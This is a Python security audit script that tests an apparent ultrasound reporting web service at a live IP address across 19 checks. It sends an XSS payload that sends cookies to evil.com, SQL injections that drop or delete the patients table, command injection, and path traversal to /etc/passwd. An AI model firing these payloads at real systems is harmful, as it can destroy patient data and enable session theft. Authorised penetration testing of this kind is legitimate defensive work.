#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Security audit script for ultrasound reporting system (https://47.109.151.238/)."""

import http.client
import ssl
import json
import sys
import io
from datetime import datetime

# Force UTF-8 output to avoid GBK issues on Windows
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

HOST = "47.109.151.238"
BASE = "https://" + HOST

# SSL context: no verification
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = []

def record(num, test, result, risk, note=""):
    results.append((num, test, result, risk, note))
    symbol = {"PASS": "[PASS]", "FAIL": "[FAIL]", "WARN": "[WARN]"}.get(result, "[???]")
    print(f"{symbol} #{num} {test} | Risk:{risk} | {note}")

def conn():
    return http.client.HTTPSConnection(HOST, timeout=15, context=ctx)

def request(method, path, body=None, headers=None, expect_status=None):
    """Make request and return (status, headers_dict, body_text)."""
    h = headers or {}
    b = None
    if body is not None:
        if isinstance(body, str):
            b = body.encode("utf-8")
        else:
            b = json.dumps(body).encode("utf-8")
            if "Content-Type" not in h:
                h["Content-Type"] = "application/json"
        h["Content-Length"] = str(len(b))
    c = conn()
    c.request(method, path, body=b if body else None, headers=h if h else {})
    resp = c.getresponse()
    data = resp.read().decode("utf-8", errors="replace")
    c.close()
    return resp.status, dict(resp.getheaders()), data


# ============ I. Injection Attacks ============

# 1. XSS <img onerror>
try:
    status, hdrs, body = request("POST", "/api/structure",
        {"text": "<img src=x onerror=alert(1)>"})
    if "<img" in body and "onerror" in body:
        record(1, "XSS <img onerror>", "FAIL", "HIGH",
               f"Payload returned raw/unencoded, status={status}")
    elif "<img" in body and "onerror" not in body:
        record(1, "XSS <img onerror>", "PASS", "HIGH",
               "onerror filtered but img tag partially kept")
    else:
        record(1, "XSS <img onerror>", "PASS", "HIGH",
               f"Payload escaped/filtered, status={status}")
except Exception as e:
    record(1, "XSS <img onerror>", "WARN", "HIGH", f"Request failed: {e}")

# 2. XSS <script> cookie theft
try:
    status, hdrs, body = request("POST", "/api/structure",
        {"text": "<script>fetch('http://evil.com/'+document.cookie)</script>"})
    if "<script>" in body.lower() and "fetch" in body:
        record(2, "XSS <script> cookie theft", "FAIL", "HIGH",
               f"Full script tag returned raw, status={status}")
    elif "<script>" not in body.lower():
        record(2, "XSS <script> cookie theft", "PASS", "HIGH",
               "script tag filtered/escaped")
    else:
        record(2, "XSS <script> cookie theft", "FAIL", "HIGH",
               f"Partial payload preserved, status={status}")
except Exception as e:
    record(2, "XSS <script> cookie theft", "WARN", "HIGH", f"Request failed: {e}")

# 3. SQL Injection - quick-add name DROP TABLE
try:
    status, hdrs, body = request("POST", "/api/patients/quick-add",
        {"name": "test'; DROP TABLE patients;--", "age": 30, "gender": "male"})
    status2, hdrs2, body2 = request("GET", "/api/patients/queue")
    if status2 == 200:
        record(3, "SQLi DROP TABLE patients", "PASS", "HIGH",
               f"Database intact, queue status={status2}")
    else:
        record(3, "SQLi DROP TABLE patients", "FAIL", "HIGH",
               f"Table may be damaged, status={status2}")
except Exception as e:
    record(3, "SQLi DROP TABLE patients", "WARN", "HIGH", f"Request failed: {e}")

# 4. SQL Injection - status DELETE
try:
    status, hdrs, body = request("PUT",
        "/api/patients/1/status?status=done'; DELETE FROM patients WHERE 1=1;--")
    status2, hdrs2, body2 = request("GET", "/api/patients/queue")
    if status2 == 200:
        record(4, "SQLi DELETE patients", "PASS", "HIGH",
               f"DELETE not executed, database OK, status={status2}")
    else:
        record(4, "SQLi DELETE patients", "FAIL", "HIGH",
               f"SQL may have executed, status={status2}")
except Exception as e:
    record(4, "SQLi DELETE patients", "WARN", "HIGH", f"Request failed: {e}")

# 5. Command Injection
try:
    status1, _, body1 = request("POST", "/api/structure", {"text": "$(whoami)"})
    status2, _, body2 = request("POST", "/api/structure", {"text": "`whoami`"})
    has_cmd1 = "administrator" in body1.lower() or "root" in body1.lower()
    has_cmd2 = "administrator" in body2.lower() or "root" in body2.lower()
    if not has_cmd1 and not has_cmd2:
        record(5, "Command Injection $(whoami)/`whoami`", "PASS", "HIGH",
               "Commands not executed by shell, text preserved as-is or filtered")
    else:
        record(5, "Command Injection $(whoami)/`whoami`", "FAIL", "HIGH",
               "Response may contain command execution output")
except Exception as e:
    record(5, "Command Injection $(whoami)/`whoami`", "WARN", "HIGH", f"Request failed: {e}")


# ============ II. Authentication & Authorization ============

# 6. Unauthorized access
try:
    endpoints = [
        ("GET", "/api/patients/queue"),
        ("GET", "/api/patients/1"),
        ("GET", "/api/structure"),
        ("GET", "/api/health"),
        ("POST", "/api/patients/quick-add"),
    ]
    all_open = True
    details = []
    for method, path in endpoints:
        try:
            stat, _, _ = request(method, path)
            if stat < 400:
                details.append(f"{method} {path}={stat}")
            else:
                all_open = False
                details.append(f"{method} {path}={stat}(denied)")
        except:
            details.append(f"{method} {path}=err")
    if all_open:
        record(6, "Unauthorized access (no token needed)", "FAIL", "HIGH",
               f"All endpoints accessible without auth: {', '.join(details)}")
    else:
        record(6, "Unauthorized access", "PASS", "MEDIUM",
               f"Some endpoints require auth: {', '.join(details)}")
except Exception as e:
    record(6, "Unauthorized access", "WARN", "MEDIUM", f"Test error: {e}")

# 7. CORS configuration
try:
    status, hdrs, body = request("OPTIONS", "/api/patients/queue",
        headers={"Origin": "http://evil.com", "Access-Control-Request-Method": "GET"})
    acao = hdrs.get("access-control-allow-origin", "")
    acam = hdrs.get("access-control-allow-methods", "")
    if acao == "*":
        record(7, "CORS Access-Control-Allow-Origin=*", "FAIL", "MEDIUM",
               "Any origin allowed, vulnerable to cross-site attacks")
    elif acao:
        record(7, "CORS configuration", "WARN", "LOW",
               f"ACAO={acao} ACAM={acam} - CORS present but not wide open")
    else:
        record(7, "CORS configuration", "PASS", "LOW", "No CORS headers, same-origin enforced")
except Exception as e:
    record(7, "CORS configuration", "WARN", "LOW", f"Test error: {e}")

# 8. Sensitive info in /api/health
try:
    status, hdrs, body = request("GET", "/api/health")
    sensitive_kw = ["version", "build", "commit", "database", "redis",
                    "secret", "password", "internal_ip", "hostname"]
    found = [kw for kw in sensitive_kw if kw in body.lower()]
    if found:
        record(8, "Sensitive info in /api/health", "WARN", "MEDIUM",
               f"Keywords exposed: {', '.join(found)}. Body: {body[:300]}")
    else:
        record(8, "Sensitive info in /api/health", "PASS", "LOW",
               f"No obvious sensitive info exposed, status={status}")
except Exception as e:
    record(8, "Sensitive info in /api/health", "WARN", "LOW", f"Test error: {e}")

# 9. Error information leakage
try:
    status, hdrs, body = request("POST", "/api/structure",
        body="not json{{{", headers={"Content-Type": "application/json"})
    status2, hdrs2, body2 = request("GET", "/api/nonexistent/trigger/error")
    leak_kw = ["traceback", "stack", "exception", "sql", "syntax",
               ".py", ".js", ".ts", "node_modules", "python", "at ",
               "line ", "file \""]
    leaked = []
    for resp_body in [body, body2]:
        for kw in leak_kw:
            if kw in resp_body.lower():
                leaked.append(kw)
    if leaked:
        record(9, "Error info leakage (stack/path)", "FAIL", "HIGH",
               f"Error response exposes: {', '.join(set(leaked))}. Summary: {(body+body2)[:300]}")
    else:
        record(9, "Error info leakage", "PASS", "MEDIUM",
               f"No stack/path in error responses, status={status}/{status2}")
except Exception as e:
    record(9, "Error info leakage", "WARN", "MEDIUM", f"Test error: {e}")


# ============ III. Input Validation ============

# 10. Negative age
try:
    status, hdrs, body = request("POST", "/api/patients/quick-add",
        {"name": "Negative Age Test", "age": -1, "gender": "male"})
    if status == 200 or status == 201:
        status2, hdrs2, body2 = request("GET", "/api/patients/queue")
        if '"age":-1' in body2 or '"age": -1' in body2:
            record(10, "Negative age age=-1", "FAIL", "MEDIUM",
                   "System accepted and stored negative age")
        else:
            record(10, "Negative age age=-1", "PASS", "MEDIUM",
                   f"Request accepted ({status}) but data filtered/validated")
    else:
        record(10, "Negative age age=-1", "PASS", "MEDIUM",
               f"System rejected negative age, status={status}")
except Exception as e:
    record(10, "Negative age age=-1", "WARN", "MEDIUM", f"Test error: {e}")

# 11. Overly long string
try:
    long_name = "A" * 1000
    status, hdrs, body = request("POST", "/api/patients/quick-add",
        {"name": long_name, "age": 30, "gender": "unknown"})
    if status >= 400:
        record(11, "Overlong string name=1000 chars", "PASS", "LOW",
               f"System rejected 1000-char input, status={status}")
    else:
        record(11, "Overlong string name=1000 chars", "WARN", "MEDIUM",
               f"System accepted 1000-char input, status={status}, potential buffer issue")
except Exception as e:
    record(11, "Overlong string name=1000 chars", "WARN", "LOW", f"Test error: {e}")

# 12. Empty body
try:
    status, hdrs, body = request("POST", "/api/patients/quick-add", {})
    if status >= 400:
        record(12, "Empty body body={}", "PASS", "LOW",
               f"System rejected empty body, status={status}")
    else:
        record(12, "Empty body body={}", "FAIL", "MEDIUM",
               f"System accepted empty body, status={status}, may create dirty data")
except Exception as e:
    record(12, "Empty body body={}", "WARN", "LOW", f"Test error: {e}")

# 13. Type mismatch age="abc"
try:
    status, hdrs, body = request("POST", "/api/patients/quick-add",
        {"name": "Type Test", "age": "abc", "gender": "female"})
    if status >= 400:
        record(13, "Type mismatch age='abc'", "PASS", "MEDIUM",
               f"System rejected non-numeric age, status={status}")
    else:
        record(13, "Type mismatch age='abc'", "FAIL", "MEDIUM",
               f"System accepted string age, status={status}, missing type validation")
except Exception as e:
    record(13, "Type mismatch age='abc'", "WARN", "MEDIUM", f"Test error: {e}")


# ============ IV. Path & File Security ============

# 14. Path traversal
try:
    paths = [
        "/../../etc/passwd",
        "/..%2f..%2fetc%2fpasswd",
        "/%2e%2e/%2e%2e/etc/passwd",
        "/api/../../etc/passwd",
    ]
    traversal_ok = True
    details_14 = []
    for p in paths:
        try:
            stat, _, body = request("GET", p)
            if "root:" in body or "daemon:" in body:
                traversal_ok = False
                details_14.append(f"{p}=LEAKED")
            else:
                details_14.append(f"{p}={stat}")
        except:
            details_14.append(f"{p}=err")
    if traversal_ok:
        record(14, "Path traversal /../../etc/passwd", "PASS", "HIGH",
               f"Path traversal blocked: {', '.join(details_14)}")
    else:
        record(14, "Path traversal /../../etc/passwd", "FAIL", "HIGH",
               f"Path traversal successful: {', '.join(details_14)}")
except Exception as e:
    record(14, "Path traversal", "WARN", "HIGH", f"Test error: {e}")

# 15. Static file access - nginx config
try:
    cfg_paths = [
        "/../../etc/nginx/nginx.conf",
        "/..%2f..%2fetc%2fnginx%2fnginx.conf",
    ]
    accessed = False
    details_15 = []
    for p in cfg_paths:
        try:
            stat, _, body = request("GET", p)
            if "nginx" in body.lower() and ("server" in body.lower() or "location" in body.lower()):
                accessed = True
                details_15.append(f"{p}=EXPOSED({len(body)}b)")
            else:
                details_15.append(f"{p}={stat}")
        except:
            details_15.append(f"{p}=err")
    if accessed:
        record(15, "Static file access nginx.conf", "FAIL", "HIGH",
               f"Nginx config readable: {', '.join(details_15)}")
    else:
        record(15, "Static file access nginx.conf", "PASS", "MEDIUM",
               f"Config not accessible: {', '.join(details_15)}")
except Exception as e:
    record(15, "Static file access nginx.conf", "WARN", "MEDIUM", f"Test error: {e}")

# 16. Hidden endpoints
try:
    hidden = [
        "/admin",
        "/api/admin",
        "/debug",
        "/.env",
        "/.git/config",
        "/api/debug",
        "/swagger",
        "/api-docs",
        "/graphql",
        "/phpinfo.php",
        "/console",
    ]
    exposed = []
    for p in hidden:
        try:
            stat, _, body = request("GET", p)
            if stat != 404 and stat != 403:
                exposed.append(f"{p}={stat}")
        except:
            pass
    if exposed:
        record(16, "Hidden endpoint discovery", "WARN", "MEDIUM",
               f"Accessible hidden endpoints: {', '.join(exposed)}")
    else:
        record(16, "Hidden endpoint discovery", "PASS", "LOW", "No debug/admin endpoints accessible")
except Exception as e:
    record(16, "Hidden endpoint discovery", "WARN", "LOW", f"Test error: {e}")


# ============ V. HTTPS & Transport Security ============

# 17. HTTP downgrade attack
http_results = []
for port in [8700, 80]:
    try:
        hc = http.client.HTTPConnection(HOST, port=port, timeout=10)
        hc.request("GET", "/")
        resp = hc.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        hc.close()
        if resp.status in (301, 302, 307, 308):
            loc = dict(resp.getheaders()).get("location", "")
            if loc.startswith("https"):
                http_results.append(f"port{port}=redirect->HTTPS({loc})")
            else:
                http_results.append(f"port{port}=redirect->{loc}")
        else:
            http_results.append(f"port{port}=open({resp.status}) body:{data[:100]}")
    except ConnectionRefusedError:
        http_results.append(f"port{port}=refused")
    except TimeoutError:
        http_results.append(f"port{port}=timeout")
    except OSError as e:
        http_results.append(f"port{port}=unreachable({e})")
    except Exception as e:
        http_results.append(f"port{port}=error({e})")

all_blocked = all("refused" in r or "timeout" in r or "unreachable" in r for r in http_results)
if all_blocked:
    record(17, "HTTP downgrade attack", "PASS", "MEDIUM",
           f"HTTP ports blocked/unreachable: {'; '.join(http_results)}")
else:
    has_redirect = any("redirect->HTTPS" in r for r in http_results)
    has_open = any("open" in r for r in http_results)
    if has_open:
        record(17, "HTTP downgrade attack", "FAIL", "HIGH",
               f"HTTP accessible without HTTPS redirect: {'; '.join(http_results)}")
    elif has_redirect:
        record(17, "HTTP downgrade attack", "PASS", "MEDIUM",
               f"HTTP redirects to HTTPS: {'; '.join(http_results)}")
    else:
        record(17, "HTTP downgrade attack", "WARN", "MEDIUM",
               f"Inconclusive: {'; '.join(http_results)}")

# 18. SSL Certificate check
try:
    import socket
    sock = socket.create_connection((HOST, 443), timeout=10)
    ssock = ctx.wrap_socket(sock, server_hostname=HOST)
    cert = ssock.getpeercert(binary_form=False)
    ssock.close()
    if cert:
        not_after = cert.get("notAfter", "")
        subject = dict(x[0] for x in cert.get("subject", []))
        san = cert.get("subjectAltName", [])
        try:
            from datetime import datetime as dt
            expiry = dt.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            days_left = (expiry - dt.utcnow()).days
        except:
            days_left = "unknown"
        if isinstance(days_left, int) and days_left > 30:
            record(18, "SSL certificate check", "PASS", "MEDIUM",
                   f"CN={subject.get('commonName','?')} expires={not_after} ({days_left}d left) SAN={len(san)}")
        else:
            record(18, "SSL certificate check", "WARN", "MEDIUM",
                   f"CN={subject.get('commonName','?')} expires={not_after} ({days_left}d left!) SAN={len(san)}")
    else:
        record(18, "SSL certificate check", "WARN", "MEDIUM", "Could not get certificate info")
except Exception as e:
    record(18, "SSL certificate check", "WARN", "MEDIUM", f"Cert check failed: {e}")

# 19. Security headers
try:
    status, hdrs, body = request("GET", "/")
    sec_headers = {
        "X-Content-Type-Options": hdrs.get("x-content-type-options", "MISSING"),
        "X-Frame-Options": hdrs.get("x-frame-options", "MISSING"),
        "Strict-Transport-Security": hdrs.get("strict-transport-security", "MISSING"),
        "Content-Security-Policy": hdrs.get("content-security-policy", "MISSING"),
        "X-XSS-Protection": hdrs.get("x-xss-protection", "MISSING"),
        "Referrer-Policy": hdrs.get("referrer-policy", "MISSING"),
        "Permissions-Policy": hdrs.get("permissions-policy", "MISSING"),
    }
    missing = [k for k, v in sec_headers.items() if v == "MISSING"]
    present = [f"{k}={v}" for k, v in sec_headers.items() if v != "MISSING"]
    if len(missing) >= 5:
        record(19, "Security headers", "FAIL", "MEDIUM",
               f"Severely missing ({len(missing)}/7): {', '.join(missing)}. Present: {'; '.join(present) if present else 'none'}")
    elif missing:
        record(19, "Security headers", "WARN", "LOW",
               f"Partially missing ({len(missing)}/7): {', '.join(missing)}. Present: {'; '.join(present)}")
    else:
        record(19, "Security headers", "PASS", "LOW", "All security headers configured")
except Exception as e:
    record(19, "Security headers", "WARN", "LOW", f"Test error: {e}")


# ============ Print Summary Table ============
print("\n" + "="*130)
print("Ultrasound Reporting System - Security Audit Report")
print(f"Target: {BASE}")
print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("="*130)
print(f"{'#':<5} {'Test Item':<45} {'Result':<7} {'Risk':<7} {'Notes'}")
print("-"*130)
for num, test, result, risk, note in results:
    # Truncate note for table
    note_display = note[:85] if len(note) <= 85 else note[:82] + "..."
    print(f"{num:<5} {test:<45} {result:<7} {risk:<7} {note_display}")
print("-"*130)

pass_count = sum(1 for r in results if r[2] == "PASS")
fail_count = sum(1 for r in results if r[2] == "FAIL")
warn_count = sum(1 for r in results if r[2] == "WARN")
high_risk_fails = sum(1 for r in results if r[2] == "FAIL" and r[3] == "HIGH")
print(f"\nTotal: {len(results)} | PASS:{pass_count} | FAIL:{fail_count} | WARN:{warn_count} | HIGH-risk FAILs:{high_risk_fails}")
print("="*130)
